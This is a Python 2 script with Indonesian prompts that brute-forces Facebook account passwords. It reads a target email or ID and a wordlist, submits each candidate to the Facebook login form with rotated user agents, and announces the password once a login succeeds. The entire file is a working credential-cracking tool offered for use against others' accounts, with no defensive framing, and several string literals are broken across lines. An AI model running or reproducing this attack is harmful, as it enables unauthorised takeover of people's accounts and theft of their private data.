#!usr/bin/python2.7
# -*- coding: UTF-8 -*-
#Created by Tegar ID

# SILAHKAN COSTUMISASI SENDIRI YA BOSQ #

import os
import sys
import time
import random
import cookielib
import mechanize

wd = "[90;1m" # dark
GL = "[96;1m" # Blue aqua
BB = "[34;1m" # Blue light
YY = "[33;1m" # Yellow light
GG = "[32;1m" # Green light
WW = "[0;1m"  # White light
RR = "[31;1m" # Red light
CC = "[36;1m" # Cyan light
B = "[34m"    # Blue
Y = "[33;1m"    # Yellow
G = "[32m"    # Green
W = "[0;1m"     # White
R = "[31m"    # Red
C = "[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '
':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print Y+"╔══════════════════════════════════════════╗"
    print Y+"║ * Author   : Anon555                     ║"
    print Y+"║ * YouTube  : Blum Buat                   ║"
    print Y+"║ * Whatsapp : Privasii                    ║"
    print Y+"╚══════════════════════════════════════════╝"

banner ()

email_target = str(raw_input(GL+"[92mMasukkan Email/Id Target =>[93m  "))
password_list = str(raw_input(GG+"Ketik pass.txt =>[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Coba Lagi ?[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 force.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."
                    sys.exit()
                else:
                    print RR+"Pilih yang bener cuk..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist bos? [96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Keluar Dari Program..."
                sys.exit()

        else:
                print RR+"Pilih yg bener..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" wordlist tidak ada yg cocok..."
        print " "
def BLANK(hack_password):
  try:
        sys.stdout.write(GG+"
[[91m+[92m][91;1m [[97m"+email_target+"[91m][90m Mencoba Password ==> [91m[[90;1m"+hack_password)
        sys.stdout.flush()
        noobs.addheaders = [('User-agent', random.choice(useragents))]
        site = noobs.open(login)
        noobs.select_form(nr = 0)
        noobs.form['email'] = email_target
        noobs.form['pass'] = hack_password
        tom = noobs.submit()
        mask = tom.geturl()
        if mask != login and (not 'login_attempt' in mask):
                        print " "
                        print ("[96m                S U C C E S S")
                        print "          P A S S W O R D  F I N D "
                        print RR+"+-------------------------------------------+"
                        print (RR+"#[97m ID / Email Target:[92m {}").format(email_target)
                        print (RR+"#[97m Password Target:[92m {}").format(hack_password)
                        print " "
                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
                        sys.exit(1)


  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()
def life():
        global hack_password
        password_nob = open(password_list, "r")
        for hack_password in password_nob:
                password_nob = hack_password.replace("
","")
                BLANK(hack_password)

def runn_noobs():
         global password_list

         lop = GG+"[90;1m[RG4]Black_Coder[91;1m
Creator by:[97m Anon 555


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target[97;1m: {}".format(email_target)
         print wd+" [#] Jumlah Wordlist Saat Ini[97;1m:", len(nuub),'password'
         print wd+" [#] Tunggu Proses Cracking[97;1m.........."
         print " "

if __name__=='__main__':
        main()
        
